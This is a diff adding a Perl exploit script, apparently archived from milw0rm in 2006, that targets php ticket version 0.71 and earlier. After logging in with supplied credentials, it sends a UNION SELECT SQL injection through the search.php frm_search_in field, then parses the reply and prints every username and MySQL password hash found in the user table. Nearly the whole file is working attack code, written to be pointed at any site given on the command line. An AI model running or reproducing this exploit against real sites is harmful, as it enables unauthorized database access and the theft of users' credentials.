@@ -1,0 +1,116 @@
+#!/usr/bin/perl
+
+###############################################################################
+#Copyright (C) undefined1_
+#
+#This program is free software; you can redistribute it and/or
+#modify it under the terms of the GNU General Public License
+#as published by the Free Software Foundation; either version 2
+#of the License, or (at your option) any later version.
+#
+#This program is distributed in the hope that it will be useful,
+#but WITHOUT ANY WARRANTY; without even the implied warranty of
+#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#GNU General Public License for more details.
+#
+#You should have received a copy of the GNU General Public License
+#along with this program; if not, write to the Free Software
+#Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
+#
+###############################################################################
+
+use strict; 
+use IO::Socket;
+
+$| = 1;
+printf ":: php ticket <= 0.71 exploit (privilege escalation) - by undefined1_ @ bash-x.net/undef/ ::\n\n\n";
+
+
+my $website = shift || usage();
+my $user = shift || usage();
+my $password = shift || usage();
+
+my $path = "/";
+my $site = $website;
+if(index($website, "/") != -1)
+{
+	my $index = index($website, "/");
+	$path = substr($website, $index);
+	$site = substr($website, 0, $index);
+	if(substr($path, length($path)-1) ne "/")
+	{
+		$path .= "/";
+	}
+}
+
+
+my $eop = "\r\nHost: $site\r\n";
+$eop .= "User-Agent: Mozilla/5.0\r\n";
+$eop .= "Connection: close\r\n";
+
+
+
+my $packet1 = "POST ".$path."search.php HTTP/1.1\r\n";
+my $postdata = "Content-Type: application/x-www-form-urlencoded\r\n";
+$postdata .= "Host: $site\r\n";
+$postdata .= "User-Agent: Mozilla/5.0\r\n";
+$postdata .= "Connection: close\r\n";
+$postdata .= "Content-Length: 31\r\n";
+$postdata .= "Cookie: PHPSESSID=aeb241ebabb33d5fb5ba756453f725e8\r\n\r\n";
+$postdata .= "frm_user=".$user."&frm_passwd=".$password;
+my $data = sendpacket($site, $packet1.$postdata);
+
+
+
+my $packet2 = "POST ".$path."search.php HTTP/1.1\r\n";
+$postdata = "Content-Type: application/x-www-form-urlencoded\r\n";
+$postdata .= "Host: $site\r\n";
+$postdata .= "User-Agent: Mozilla/5.0\r\n";
+$postdata .= "Connection: close\r\n";
+$postdata .= "Content-Length: 215\r\n";
+$postdata .= "Cookie: PHPSESSID=aeb241ebabb33d5fb5ba756453f725e8\r\n\r\n";
+$postdata .= "frm_query=a&frm_search_in=1%3D0+union+all+select+1%2C1%2C1%2C1%2C1%2C1%2CCONCAT%280x30576e656420%2Cuser%2C0x20%2Cpasswd%29%2C1%2C1%2C1%2C1%2C1%2C1+from+user--&frm_ordertype=date&frm_order_desc=DESC&frm_querytype=%25";
+$data = sendpacket($site, $packet2.$postdata);
+
+
+print "password are encrypted with the PASSWORD() function of mysql\n\n";
+
+printf("username%-20spassword\n", " ");
+printf("--------%-20s--------\n", " ");
+my $index = 0;
+while(($index = index($data,"0Wned ", $index)) != -1)
+{
+	$index += 6;
+	my $index2 = index($data," ", $index);
+	my $index3 = index($data,"</A>", $index2);
+	printf("%s%-20s%s\n", substr($data,$index,$index2-$index) , " ", substr($data,$index2+1,$index3-($index2+1)));
+	$index = $index3+4;
+}
+
+
+sub sendpacket(\$,\$) {
+	my $server = shift;
+	my $request = shift;
+
+	my $sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $server, PeerPort => "80") or die "[-] Could not connect to $server:80 $!\n";
+	print $sock "$request";
+
+	
+	my $data = "";
+	my $answer;
+	while($answer = <$sock>)
+	{
+		$data .= $answer;
+	}
+	
+	close($sock);
+	return $data;
+}
+
+sub usage() {
+	printf "usage: %s <website> <user> <password>\n", $0;
+	printf "exemple: %s www.site.com/phpticket/\n", $0;
+	exit;
+}
+
+# milw0rm.com [2006-03-25]
